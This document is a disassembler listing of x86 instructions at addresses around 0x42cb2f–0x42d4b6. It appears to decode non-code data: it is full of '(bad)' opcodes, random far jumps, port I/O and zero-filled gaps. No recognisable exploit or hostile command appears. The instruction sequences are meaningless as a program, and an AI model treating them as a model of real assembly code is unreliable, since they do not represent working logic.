  42cb2f:	sub    al,0x6
  42cb31:	shr    DWORD PTR [edx+0x4d30028f],cl
  42cb37:	pushf  
  42cb38:	(bad)  
  42cb39:	ja     0x42cb91
  42cb3b:	and    al,0xd5
  42cb3d:	or     BYTE PTR [edi-0x12],ch
  42cb40:	aas    
  42cb41:	dec    ebx
  42cb42:	in     al,0xff
  42cb44:	mov    dh,0x89
  42cb46:	dec    ebx
  42cb47:	loopne 0x42cb20
  42cb49:	les    ebx,FWORD PTR [ebp-0x170526d6]
  42cb4f:	jecxz  0x42cb4c
  42cb51:	xchg   ebx,eax
  42cb52:	mov    eax,0x664c55b5
  42cb57:	sbb    eax,DWORD PTR [edi-0x7d31f646]
  42cb5d:	mov    ch,0x26
  42cb5f:	mov    dh,0x1c
  42cb61:	xchg   DWORD PTR [edi-0x1a],edx
  42cb64:	mov    edi,0x84d1635d
  42cb69:	lea    edx,[eax-0xd904085]
  42cb6f:	add    eax,0xbbe72c90
  42cb74:	pusha  
  42cb75:	xchg   esi,eax
  42cb76:	aam    0xfa
  42cb78:	pop    es
  42cb79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb7a:	(bad)  
  42cb7b:	call   0xeed7:0x89ab2a4e
  42cb82:	mov    dl,bl
  42cb84:	xor    al,0x64
  42cb86:	aas    
  42cb87:	test   BYTE PTR [edi+ebx*1+0x30],dh
  42cb8b:	in     eax,dx
  42cb8c:	fs inc esp
  42cb8e:	neg    BYTE PTR [ecx-0x606a067b]
  42cb94:	daa    
  42cb95:	(bad)  
  42cb96:	gs push esi
  42cb98:	push   esp
  42cb99:	pop    eax
  42cb9a:	and    eax,0x534c5bd2
  42cb9f:	lock xor eax,0x3aefe83a
  42cba5:	icebp  
  42cba6:	inc    esp
  42cba7:	push   es
  42cba8:	loopne 0x42cbff
  42cbaa:	push   es
  42cbab:	sub    esp,edi
  42cbad:	les    edx,FWORD PTR [edi]
  42cbaf:	and    ebx,0xffffffa4
  42cbb2:	into   
  42cbb3:	cmp    bl,BYTE PTR [edx]
  42cbb5:	enter  0x2f36,0x43
  42cbb9:	mov    eax,ds:0x5cd2484e
  42cbbe:	or     al,0x6c
  42cbc0:	dec    ebp
  42cbc1:	pop    edx
  42cbc2:	not    BYTE PTR [esi-0x4483ac04]
  42cbc8:	ins    DWORD PTR es:[edi],dx
  42cbc9:	retf   
  42cbca:	pop    ss
  42cbcb:	bound  esi,QWORD PTR [eax+edx*4]
  42cbce:	popa   
  42cbcf:	mov    gs,WORD PTR [edi-0x39]
  42cbd2:	ds dec esi
  42cbd4:	mov    edi,0x22c51b72
  42cbd9:	cmc    
  42cbda:	fwait
  42cbdb:	adc    ecx,ebp
  42cbdd:	xor    al,0xb7
  42cbdf:	out    0xbb,eax
  42cbe1:	pop    ebx
  42cbe2:	aad    0x8c
  42cbe4:	cmp    DWORD PTR [eax+ecx*1],0xffffffcb
  42cbe8:	ret    
  42cbe9:	mov    ch,0x99
  42cbeb:	aam    0xd5
  42cbed:	fdiv   DWORD PTR [ebx]
  42cbef:	dec    ebp
  42cbf0:	shl    BYTE PTR [ebx-0x39],1
  42cbf3:	mov    dh,0xca
  42cbf5:	xor    bh,BYTE PTR [esi]
  42cbf7:	and    eax,0xd4f349d4
  42cbfc:	es nop
  42cbfe:	rol    ah,1
  42cc00:	retf   0x25f1
  42cc03:	leave  
  42cc04:	xor    esp,DWORD PTR [eax]
  42cc06:	jmp    0x16e9:0x2af0fc13
  42cc0d:	in     eax,0x86
  42cc0f:	(bad)  
  42cc10:	mov    esi,0x0
	...
  42cc71:	add    BYTE PTR [eax],al
  42cc73:	add    BYTE PTR [edi+0x2],bh
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0xcf5436fb
  42cc84:	or     eax,esp
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    eax,0xa0000001
  42cc8d:	div    DWORD PTR [ebx+0xb]
  42cc90:	adc    bl,bh
  42cc92:	cli    
  42cc93:	lahf   
  42cc94:	fadd   QWORD PTR [edi-0x3c]
  42cc97:	sbb    BYTE PTR [edi-0x6ad04bbc],al
  42cc9d:	mov    cl,bh
  42cc9f:	fldenv [eax]
  42cca1:	and    ebx,DWORD PTR [edi+0x2a678a93]
  42cca7:	retf   
  42cca8:	(bad)  
  42cca9:	(bad)  
  42ccaa:	addr16 mov bh,0xe0
  42ccad:	loope  0x42cc4d
  42ccaf:	cmp    eax,0x7ac7c03e
  42ccb4:	std    
  42ccb5:	ds jns 0x42cd0a
  42ccb8:	dec    edi
  42ccb9:	loopne 0x42ccd0
  42ccbb:	in     al,0x7
  42ccbd:	jl     0x42cca1
  42ccbf:	push   ss
  42ccc0:	cmp    al,0x96
  42ccc2:	push   0x79681587
  42ccc7:	pop    esi
  42ccc8:	cmc    
  42ccc9:	mov    al,ds:0x70dc1c50
  42ccce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cccf:	lods   eax,DWORD PTR ds:[esi]
  42ccd0:	es dec edx
  42ccd2:	rcl    DWORD PTR [edx+esi*1],0xb2
  42ccd6:	jl     0x42cd4c
  42ccd8:	(bad)  
  42ccd9:	outs   dx,BYTE PTR ds:[esi]
  42ccda:	xchg   edx,eax
  42ccdb:	and    BYTE PTR [edx+0x29],0x25
  42ccdf:	xchg   esi,eax
  42cce0:	ss or  al,0x7b
  42cce3:	fwait
  42cce4:	add    bl,BYTE PTR [esi]
  42cce6:	xor    esi,DWORD PTR [edi]
  42cce8:	xchg   ebp,eax
  42cce9:	nop
  42ccea:	or     ah,BYTE PTR [ebx-0x33]
  42cced:	dec    edi
  42ccee:	int3   
  42ccef:	into   
  42ccf0:	adc    ebp,0xd6f49b07
  42ccf6:	cmp    al,0x9a
  42ccf8:	dec    ebx
  42ccf9:	push   esp
  42ccfa:	jae    0x42cc86
  42ccfc:	rcl    DWORD PTR [edx],0xb0
  42ccff:	sub    ebx,DWORD PTR [ebx+0x25274abc]
  42cd05:	cs test eax,0xb333cbe8
  42cd0b:	ret    0x62e7
  42cd0e:	fs (bad) 
  42cd10:	mov    eax,0xf0586b08
  42cd15:	and    ah,BYTE PTR [eax]
  42cd17:	(bad)  
  42cd18:	clc    
  42cd19:	nop
  42cd1a:	xchg   dh,bl
  42cd1c:	in     eax,0x79
  42cd1e:	jo     0x42cce7
  42cd20:	dec    BYTE PTR [ebp+0x7]
  42cd23:	xor    eax,0x31
  42cd26:	push   ecx
  42cd27:	cvttps2pi mm2,QWORD PTR [edx+0x648f6daa]
  42cd2e:	inc    esp
  42cd2f:	ror    BYTE PTR [esi+0x454fca49],1
  42cd35:	inc    ebx
  42cd36:	add    edi,eax
  42cd38:	ja     0x42ccef
  42cd3a:	push   ebp
  42cd3b:	shl    DWORD PTR [eax+0x26f0c44a],0x8a
  42cd42:	adc    dl,BYTE PTR [esi-0x2a]
  42cd45:	inc    eax
  42cd46:	sub    esp,ebx
  42cd48:	inc    ebx
  42cd49:	jl     0x42cd32
  42cd4b:	fxch   st(7)
  42cd4d:	pop    ss
  42cd4e:	sub    DWORD PTR [ebp+0x69],ecx
  42cd51:	fs push esi
  42cd53:	fmul   QWORD PTR [esi+eiz*4-0x13268de6]
  42cd5a:	xchg   ecx,eax
  42cd5b:	loop   0x42cdcd
  42cd5d:	retf   
  42cd5e:	out    dx,al
  42cd5f:	ret    0x9665
  42cd62:	mov    dl,0xd7
  42cd64:	push   es
  42cd65:	int    0xbd
  42cd67:	xor    ch,cl
  42cd69:	jne    0x42cd89
  42cd6b:	pop    ebx
  42cd6c:	adc    ch,bh
  42cd6e:	adc    BYTE PTR [edi+esi*2],ch
  42cd71:	ret    0x731e
  42cd74:	adc    al,0x55
  42cd76:	lock cmp dh,dh
  42cd79:	in     al,0x9b
  42cd7b:	xor    DWORD PTR [ecx+0x4b7ba331],esi
  42cd81:	dec    dl
  42cd83:	cmp    DWORD PTR [esi-0x30efa031],0xffffffd7
  42cd8a:	es clc 
  42cd8c:	out    dx,al
  42cd8d:	je     0x42cd76
  42cd8f:	retf   
  42cd90:	test   BYTE PTR [eax],al
	...
  42cdf2:	add    BYTE PTR [eax],al
  42cdf4:	sbb    DWORD PTR [ecx-0x20017802],esp
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0x26
  42ce01:	push   cs
  42ce02:	imul   ebx,DWORD PTR ds:0x1e10e,0x105
  42ce0c:	mov    BYTE PTR [eax+0x19],dh
  42ce0f:	jns    0x42ce73
  42ce11:	mov    ebp,0x8562a45e
  42ce16:	jmp    0xb8f8:0x85e9e89c
  42ce1d:	mov    edi,0x772366b2
  42ce22:	dec    esp
  42ce23:	rcr    edi,0x8e
  42ce26:	mov    esi,0x5e915977
  42ce2b:	inc    esp
  42ce2c:	inc    edx
  42ce2d:	pop    eax
  42ce2e:	add    DWORD PTR [edi-0xa],0x7e19123b
  42ce35:	xchg   ebx,edx
  42ce37:	(bad)  
  42ce38:	retf   
  42ce39:	or     bl,BYTE PTR [eax+eiz*8]
  42ce3c:	cld    
  42ce3d:	xor    DWORD PTR [ebx],ebx
  42ce3f:	das    
  42ce40:	jo     0x42ce3d
  42ce42:	push   esp
  42ce43:	int    0x72
  42ce45:	call   eax
  42ce47:	bound  esi,QWORD PTR [ebx-0x19]
  42ce4a:	lods   al,BYTE PTR ds:[esi]
  42ce4b:	into   
  42ce4c:	test   eax,0x539c70ab
  42ce51:	lods   al,BYTE PTR ds:[esi]
  42ce52:	je     0x42ce3b
  42ce54:	xor    BYTE PTR [edi+eax*8+0x7bc197fa],0x3f
  42ce5c:	ret    0x89d2
  42ce5f:	adc    BYTE PTR [edx+0x2a],cl
  42ce62:	pop    ebx
  42ce63:	jmp    0x6631db80
  42ce68:	and    al,0x6d
  42ce6a:	or     eax,0x8416ad40
  42ce6f:	mov    edx,0xf514f37d
  42ce74:	lea    edx,[esi-0x5d]
  42ce77:	mov    edx,0x1867fdae
  42ce7c:	call   0x836:0xa4fad135
  42ce83:	js     0x42cec3
  42ce85:	and    BYTE PTR [ebp+ebx*1+0x1a],dl
  42ce89:	or     ebp,esp
  42ce8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ce8c:	dec    ecx
  42ce8d:	add    eax,0x63c2b0cb
  42ce92:	xor    BYTE PTR [eax+0x55e7776e],ch
  42ce98:	xor    al,0x80
  42ce9a:	imul   ecx,eax,0x8
  42ce9d:	xchg   edi,eax
  42ce9e:	pop    ss
  42ce9f:	into   
  42cea0:	(bad)  
  42cea1:	mov    BYTE PTR [edi-0x64],cl
  42cea4:	das    
  42cea5:	push   DWORD PTR [ebx-0x30]
  42cea8:	rcr    BYTE PTR [ebx+0x6f3585de],1
  42ceae:	and    al,0x35
  42ceb0:	dec    eax
  42ceb1:	mov    ebx,0xe7420cd6
  42ceb6:	xchg   esp,eax
  42ceb7:	mov    esp,0x8a37943b
  42cebc:	dec    edi
  42cebd:	adc    BYTE PTR [esi+0x37],dl
  42cec0:	push   ds
  42cec1:	push   ebx
  42cec2:	(bad)  
  42cec3:	and    al,0x9c
  42cec5:	sub    BYTE PTR [edx+0x5f1574c2],ah
  42cecb:	stos   DWORD PTR es:[di],eax
  42cecd:	dec    esp
  42cece:	pop    es
  42cecf:	and    dh,dl
  42ced1:	dec    ebx
  42ced2:	xchg   ecx,eax
  42ced3:	ror    DWORD PTR [edi+0x66],0xaf
  42ced7:	fistp  QWORD PTR [esi+0x2]
  42ceda:	push   ecx
  42cedb:	or     dl,BYTE PTR [ecx]
  42cedd:	sbb    ecx,DWORD PTR [edx+ebp*4+0x56]
  42cee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cee2:	iret   
  42cee3:	cdq    
  42cee4:	test   al,0xf6
  42cee6:	add    eax,eax
  42cee8:	outs   dx,DWORD PTR ds:[esi]
  42cee9:	mov    dl,0x67
  42ceeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ceec:	sbb    BYTE PTR [ecx-0x6781d967],0xa9
  42cef3:	int    0x12
  42cef5:	adc    BYTE PTR [ecx-0x5a4ce4fd],bl
  42cefb:	scas   eax,DWORD PTR es:[edi]
  42cefc:	mov    eax,0x744c87b8
  42cf01:	or     DWORD PTR [edi+edi*1],ecx
  42cf04:	adc    al,0xa0
  42cf06:	adc    ah,BYTE PTR [edi+eax*1]
  42cf09:	add    bl,bl
  42cf0b:	push   ecx
  42cf0c:	xchg   ecx,eax
  42cf0d:	or     esp,edx
  42cf0f:	repnz add BYTE PTR cs:[eax],al
	...
  42cf73:	add    BYTE PTR [ebx+0x3d],dh
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	(bad)  
  42cf80:	jmp    0x42cf43
  42cf82:	imul   esp,DWORD PTR [ecx+0x13],0xffffffe2
  42cf86:	add    DWORD PTR [eax],eax
  42cf88:	add    eax,0x3a000001
  42cf8d:	or     esi,DWORD PTR [edx+0x66b43d51]
  42cf93:	pop    ds
  42cf94:	mov    DWORD PTR [ecx+0x72],ecx
  42cf97:	das    
  42cf98:	in     eax,0xf3
  42cf9a:	je     0x42cf9c
  42cf9c:	add    bh,BYTE PTR [ebp-0xce6b427]
  42cfa2:	daa    
  42cfa3:	cs in  eax,0x1e
  42cfa6:	and    BYTE PTR [ecx+0x2e],bl
  42cfa9:	std    
  42cfaa:	sbb    BYTE PTR [ecx-0x72],cl
  42cfad:	(bad)  
  42cfae:	pop    esp
  42cfaf:	jbe    0x42cfeb
  42cfb1:	adc    dh,0x6f
  42cfb4:	sar    bh,cl
  42cfb6:	xor    eax,0x1672e234
  42cfbb:	mov    ecx,0x7854ec49
  42cfc0:	push   esp
  42cfc1:	shr    BYTE PTR [eax],0xa4
  42cfc4:	retf   
  42cfc5:	lock add eax,0x3cc8bedf
  42cfcb:	shr    BYTE PTR [edi],0x27
  42cfce:	sbb    BYTE PTR [ebp+0x61a9bd0a],0x2
  42cfd5:	sbb    ah,ch
  42cfd7:	out    0x93,eax
  42cfd9:	add    DWORD PTR [esi-0x4d],eax
  42cfdc:	mov    dl,BYTE PTR [ebp+0x64d7c3c5]
  42cfe2:	xchg   BYTE PTR [ebp+0x2a3153ab],ch
  42cfe8:	sbb    ch,BYTE PTR [ecx+0x2f593c01]
  42cfee:	inc    esi
  42cfef:	loope  0x42cfa3
  42cff1:	loop   0x42d039
  42cff3:	(bad)  
  42cff4:	dec    cl
  42cff6:	sti    
  42cff7:	push   edx
  42cff8:	sahf   
  42cff9:	mov    ecx,0x8f03918b
  42cffe:	faddp  st(6),st
  42d000:	mov    esi,0xba5b0d19
  42d005:	xchg   ebp,eax
  42d006:	mov    edi,DWORD PTR [esi-0x13]
  42d009:	stc    
  42d00a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d00b:	xor    bl,BYTE PTR [edx]
  42d00d:	inc    esi
  42d00e:	dec    edx
  42d00f:	dec    ecx
  42d010:	lods   eax,DWORD PTR ds:[esi]
  42d011:	and    al,0x9
  42d013:	mov    edi,0x2f32e4b9
  42d018:	push   ebp
  42d019:	ror    esp,cl
  42d01b:	in     al,dx
  42d01c:	jns    0x42d03c
  42d01e:	sar    edi,1
  42d020:	rcl    BYTE PTR [edx+eiz*4+0x642709b8],cl
  42d027:	rcl    BYTE PTR [esp+ecx*2-0x56c5f118],cl
  42d02e:	inc    edi
  42d02f:	mov    esp,0x9c1695c1
  42d034:	push   cs
  42d035:	pop    esp
  42d036:	call   0x5803abd9
  42d03b:	sbb    bl,BYTE PTR [edi-0x17]
  42d03e:	adc    BYTE PTR [edx],ch
  42d040:	sbb    al,0x21
  42d042:	popf   
  42d043:	dec    ebp
  42d044:	stos   BYTE PTR es:[edi],al
  42d045:	les    edx,FWORD PTR [edx+0x7b]
  42d048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d049:	push   ds
  42d04a:	loope  0x42d014
  42d04c:	jne    0x42d0b0
  42d04e:	xor    DWORD PTR [esp+eax*8],esp
  42d051:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d052:	inc    edi
  42d053:	pop    es
  42d054:	stos   BYTE PTR es:[edi],al
  42d055:	mov    ds:0x29fd7ded,al
  42d05a:	push   ecx
  42d05b:	dec    esi
  42d05c:	sbb    DWORD PTR [ebx-0x202797ef],edi
  42d062:	jl     0x42cff1
  42d064:	cs jg  0x42d03d
  42d067:	mov    eax,ds:0x74fda89b
  42d06c:	mov    ebp,DWORD PTR [eax]
  42d06e:	icebp  
  42d06f:	lock fadd DWORD PTR [edi-0x69]
  42d073:	push   0xffffffe6
  42d075:	dec    ebx
  42d076:	into   
  42d077:	icebp  
  42d078:	and    dl,BYTE PTR [ecx+0xe637a9c]
  42d07e:	js     0x42d0f5
  42d080:	adc    bl,BYTE PTR [ebx+0x3b]
  42d083:	inc    ecx
  42d084:	lods   al,BYTE PTR ds:[esi]
  42d085:	mov    esp,0x33e715df
  42d08a:	out    dx,eax
  42d08b:	inc    ecx
  42d08c:	test   BYTE PTR [ebp+0xd4eed1],0x0
	...
  42d0f3:	add    BYTE PTR [eax+0x3a],dl
  42d0f6:	(bad)  
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [esi],dh
  42d101:	nop
  42d102:	jo     0x42d161
  42d104:	sbb    bl,ah
  42d106:	add    DWORD PTR [eax],eax
  42d108:	add    eax,0x59000001
  42d10d:	enter  0x6c4a,0xd0
  42d111:	imul   esp,DWORD PTR [ebx-0x2d7741fc],0x3f
  42d118:	aad    0x32
  42d11a:	and    edx,0xffffffe5
  42d11d:	(bad)  
  42d11e:	mov    eax,0x44c954fa
  42d123:	sub    BYTE PTR [ebp-0x2958df0c],bh
  42d129:	(bad)  
  42d12a:	rol    DWORD PTR [edx-0x5ba0fead],1
  42d130:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d131:	in     eax,0xfa
  42d133:	(bad)  
  42d134:	outs   dx,BYTE PTR ds:[esi]
  42d135:	popa   
  42d136:	and    bl,0x9a
  42d139:	out    dx,eax
  42d13a:	jle    0x42d14e
  42d13c:	mov    ebx,0x5e48cb17
  42d141:	(bad)  
  42d142:	(bad)  
  42d143:	out    dx,al
  42d144:	in     al,dx
  42d145:	fucomp st(7)
  42d147:	cmp    al,0x30
  42d149:	or     edx,DWORD PTR [ebx+0x36]
  42d14c:	mov    ecx,0xe3527b62
  42d151:	cdq    
  42d152:	add    dl,BYTE PTR [edi+0x15b10c1e]
  42d158:	xor    eax,0xe9f652e9
  42d15d:	mul    BYTE PTR [esi-0x20]
  42d160:	adc    eax,0xbb89b11d
  42d165:	dec    ebx
  42d166:	ds pop esp
  42d168:	hlt    
  42d169:	not    DWORD PTR ds:0x3a2e4b75
  42d16f:	out    0x36,eax
  42d171:	mov    dh,0x2
  42d173:	ficomp WORD PTR [edx-0x80]
  42d176:	inc    eax
  42d177:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d178:	jae    0x42d12f
  42d17a:	sub    al,0xcd
  42d17c:	mov    bh,0x5b
  42d17e:	pop    ebp
  42d17f:	(bad)  
  42d180:	clc    
  42d181:	sbb    BYTE PTR [ebp+0x7cc16b98],cl
  42d187:	and    eax,0x3adc85b2
  42d18c:	mov    BYTE PTR ds:0xd34eb607,dh
  42d192:	pop    ecx
  42d193:	push   ss
  42d194:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d195:	mov    bh,dh
  42d197:	outs   dx,BYTE PTR ds:[esi]
  42d198:	push   eax
  42d199:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d19a:	push   edi
  42d19b:	gs repz aaa 
  42d19e:	int    0x41
  42d1a0:	add    edi,DWORD PTR [ecx+edi*1+0x3b0a9d55]
  42d1a7:	dec    esp
  42d1a8:	cmp    DWORD PTR [ebx-0x57],ebp
  42d1ab:	sub    DWORD PTR [eax],eax
  42d1ad:	shr    BYTE PTR [ebx+0xb],1
  42d1b0:	inc    edi
  42d1b1:	(bad)  
  42d1b2:	(bad)  
  42d1b4:	pop    ds
  42d1b5:	test   al,0x8c
  42d1b7:	mov    edx,0x61e9ba15
  42d1bc:	mov    edi,0xb7565f12
  42d1c1:	lahf   
  42d1c2:	shl    BYTE PTR ds:0x975a2f8c,cl
  42d1c8:	fdiv   QWORD PTR [ebx]
  42d1ca:	in     al,0x95
  42d1cc:	and    edi,ecx
  42d1ce:	popf   
  42d1cf:	mov    al,BYTE PTR [esi-0x57]
  42d1d2:	pop    edx
  42d1d3:	repz aam 0x9c
  42d1d6:	sub    bl,BYTE PTR [ebx+0x5da40e87]
  42d1dc:	imul   esi,DWORD PTR [esi-0x3a],0x21
  42d1e0:	adc    al,0x71
  42d1e2:	jo     0x42d22a
  42d1e4:	stos   BYTE PTR es:[edi],al
  42d1e5:	sahf   
  42d1e6:	adc    eax,0x74feb85a
  42d1eb:	mov    DWORD PTR [edi+ecx*1],eax
  42d1ee:	push   ebp
  42d1ef:	mov    eax,0xd7766f53
  42d1f4:	mov    cl,BYTE PTR [ebx]
  42d1f6:	aaa    
  42d1f7:	imul   esi,ebp,0xffffffd4
  42d1fa:	outs   dx,DWORD PTR ds:[esi]
  42d1fb:	mov    ebx,ebp
  42d1fd:	outs   dx,BYTE PTR ds:[esi]
  42d1fe:	out    dx,al
  42d1ff:	xchg   ebx,eax
  42d200:	arpl   cx,bx
  42d202:	sbb    DWORD PTR [edx-0x6e56e367],ebp
  42d208:	or     BYTE PTR [esi],dh
  42d20a:	rol    BYTE PTR [ebp+0x5b],1
  42d20d:	icebp  
  42d20e:	add    ebx,eax
  42d210:	stos   BYTE PTR es:[edi],al
	...
  42d271:	add    BYTE PTR [eax],al
  42d273:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d226
  42d281:	jl     0x42d2f6
  42d283:	test   DWORD PTR ds:0x50001e4,ebx
  42d289:	add    DWORD PTR [eax],eax
  42d28b:	add    BYTE PTR [esi+0x40],dh
  42d28e:	retf   0xfec5
  42d291:	pop    edx
  42d292:	push   esp
  42d293:	pop    esp
  42d294:	call   0x138335b0
  42d299:	daa    
  42d29a:	inc    ebx
  42d29b:	mov    ebx,0x65bd0c3f
  42d2a0:	push   0x57
  42d2a2:	add    BYTE PTR [ebx-0x3f],dh
  42d2a5:	push   esp
  42d2a6:	std    
  42d2a7:	sub    edi,ebx
  42d2a9:	or     DWORD PTR fs:[edx],edi
  42d2ac:	arpl   WORD PTR [edx+0x14],cx
  42d2af:	inc    edx
  42d2b0:	xor    DWORD PTR [ebp+0x56],edi
  42d2b3:	stos   BYTE PTR es:[edi],al
  42d2b4:	push   esp
  42d2b5:	or     eax,0x42249921
  42d2ba:	into   
  42d2bb:	jne    0x42d24c
  42d2bd:	bound  eax,QWORD PTR [si-0x1804]
  42d2c2:	clc    
  42d2c3:	sti    
  42d2c4:	mov    ds:0xa1a5196d,eax
  42d2c9:	enter  0xca93,0xa3
  42d2cd:	adc    BYTE PTR [eax+0x5baae57],al
  42d2d3:	mov    ecx,0xcbbb24e4
  42d2d8:	inc    ebp
  42d2d9:	ret    0xc551
  42d2dc:	aaa    
  42d2dd:	(bad)  
  42d2de:	adc    bl,dl
  42d2e0:	push   esp
  42d2e1:	js     0x42d2b4
  42d2e3:	xchg   ecx,eax
  42d2e4:	and    eax,0x66fc31ce
  42d2e9:	stos   BYTE PTR es:[edi],al
  42d2ea:	(bad)  
  42d2eb:	jo     0x42d29f
  42d2ed:	sub    DWORD PTR gs:[edx-0x2704e903],ebx
  42d2f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d2f5:	sti    
  42d2f6:	stos   DWORD PTR es:[edi],eax
  42d2f7:	xor    eax,0xf56bf3cb
  42d2fc:	adc    dh,BYTE PTR [esi-0x42e7df62]
  42d302:	pop    ebp
  42d303:	ficom  WORD PTR [ecx-0x61509c9]
  42d309:	jecxz  0x42d362
  42d30b:	out    dx,al
  42d30c:	push   DWORD PTR [edi]
  42d30e:	test   BYTE PTR [esi],ah
  42d310:	pop    esp
  42d311:	lahf   
  42d312:	out    0x40,eax
  42d314:	les    ebx,FWORD PTR [ebp+0x1b]
  42d317:	daa    
  42d318:	in     al,0xad
  42d31a:	sbb    DWORD PTR [edi-0xfcc8ad6],0x9cefc7c4
  42d324:	in     eax,0xee
  42d326:	push   esp
  42d327:	jns    0x42d2e1
  42d329:	xchg   BYTE PTR [ebx+0xa0fc7e2],ch
  42d32f:	outs   dx,DWORD PTR ds:[esi]
  42d330:	mov    esi,0x8c7e50c7
  42d335:	or     BYTE PTR [eax],al
  42d337:	test   BYTE PTR [edx+edx*4],dl
  42d33a:	and    DWORD PTR [eax-0x4561da8d],esp
  42d340:	cmc    
  42d341:	fisttp QWORD PTR [edi]
  42d343:	pop    ds
  42d344:	daa    
  42d345:	xor    edx,edi
  42d347:	js     0x42d2d7
  42d349:	mul    BYTE PTR [esi+0x0]
  42d34c:	mov    ecx,0x82c407df
  42d351:	pop    ds
  42d352:	xchg   ecx,eax
  42d353:	cwde   
  42d354:	sub    eax,0xbbcc7687
  42d359:	dec    edx
  42d35a:	aaa    
  42d35b:	or     eax,0xfa2dbf5f
  42d360:	inc    eax
  42d361:	fwait
  42d362:	push   eax
  42d363:	out    0x27,eax
  42d365:	out    dx,al
  42d366:	sar    DWORD PTR [ecx-0x13],cl
  42d369:	push   DWORD PTR [esi+0xf]
  42d36c:	psubw  mm1,QWORD PTR [ecx-0x47]
  42d370:	arpl   WORD PTR [ebp+esi*1+0xb],cx
  42d374:	mov    WORD PTR [esi+0x46],cs
  42d377:	mov    ch,0x47
  42d379:	les    ecx,FWORD PTR [edi]
  42d37b:	std    
  42d37c:	push   ebx
  42d37d:	push   esp
  42d37e:	jno    0x42d313
  42d380:	lods   al,BYTE PTR ds:[esi]
  42d381:	out    dx,eax
  42d382:	adc    dh,ch
  42d384:	jb     0x42d32e
  42d386:	xor    eax,0x78ef2dfb
  42d38b:	loopne 0x42d3e5
  42d38d:	pop    esi
  42d38e:	add    al,0x1a
  42d390:	sbb    DWORD PTR [eax],eax
	...
  42d3f2:	add    BYTE PTR [eax],al
  42d3f4:	ror    esi,0x63
  42d3f7:	cdq    
  42d3f8:	outs   dx,DWORD PTR ds:[esi]
  42d3f9:	mov    ebp,0x9459defb
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	ret    0x48d3
  42d403:	and    BYTE PTR [edx],ah
  42d405:	in     eax,0x1
  42d407:	add    BYTE PTR ds:0xe2000001,al
  42d40d:	or     BYTE PTR [eax-0x31],dh
  42d410:	cmp    edi,ecx
  42d412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d413:	or     eax,0x56c3df0b
  42d418:	mov    eax,ds:0xc2e11226
  42d41d:	ja     0xa80bdf92
  42d423:	ja     0x42d4a3
  42d425:	sub    eax,0xb2b60c0d
  42d42a:	push   esi
  42d42b:	in     eax,0x33
  42d42d:	loop   0x42d3f6
  42d42f:	sahf   
  42d430:	add    DWORD PTR [edi],esp
  42d432:	push   0xffffff9e
  42d434:	xlat   BYTE PTR ds:[ebx]
  42d435:	ins    DWORD PTR es:[edi],dx
  42d436:	stos   BYTE PTR es:[edi],al
  42d437:	mov    bl,0x93
  42d439:	inc    ecx
  42d43a:	mov    ?,WORD PTR [edi]
  42d43c:	stc    
  42d43d:	xchg   ebp,eax
  42d43e:	out    0xf2,al
  42d440:	jno    0x42d459
  42d442:	push   eax
  42d443:	fs iret 
  42d445:	cdq    
  42d446:	ror    dl,0xba
  42d449:	lock je 0x42d4b5
  42d44c:	leave  
  42d44d:	scas   al,BYTE PTR es:[edi]
  42d44e:	and    DWORD PTR [edx-0x175b3eff],0x41
  42d455:	or     edi,DWORD PTR [eax+0x533a9555]
  42d45b:	shr    dh,cl
  42d45d:	jmp    0x42d404
  42d45f:	int    0x1
  42d461:	mov    BYTE PTR [esi+esi*2],ah
  42d464:	outs   dx,DWORD PTR ds:[esi]
  42d465:	mov    al,0xbb
  42d467:	mov    dh,0xfc
  42d469:	repz dec esp
  42d46b:	les    esi,FWORD PTR [eax+0x1f]
  42d46e:	push   ds
  42d46f:	jmp    0xba78:0xee35b1f7
  42d476:	ret    0x207b
  42d479:	adc    eax,0x386acdb6
  42d47e:	pop    ecx
  42d47f:	popf   
  42d480:	mov    bh,0xf0
  42d482:	mov    edi,0xc01be8a7
  42d487:	repz push cs
  42d489:	adc    ebx,DWORD PTR [eax]
  42d48b:	adc    ecx,esp
  42d48d:	pop    ds
  42d48e:	mov    edx,0xa56e5bda
  42d493:	out    dx,eax
  42d494:	mul    BYTE PTR [edi-0x44ec98b8]
  42d49a:	dec    eax
  42d49b:	dec    esp
  42d49c:	cli    
  42d49d:	sbb    DWORD PTR [eax+0x66101d07],ebx
  42d4a3:	mov    ah,0xf
  42d4a5:	pusha  
  42d4a6:	not    DWORD PTR [ebx+ebp*8]
  42d4a9:	pop    ss
  42d4aa:	xor    dl,ch
  42d4ac:	or     eax,0x1be2e83f
  42d4b1:	inc    ebp
  42d4b2:	push   edx
  42d4b3:	lahf   
  42d4b4:	jmp    0x42d507
  42d4b6:	jmp    0x42d526
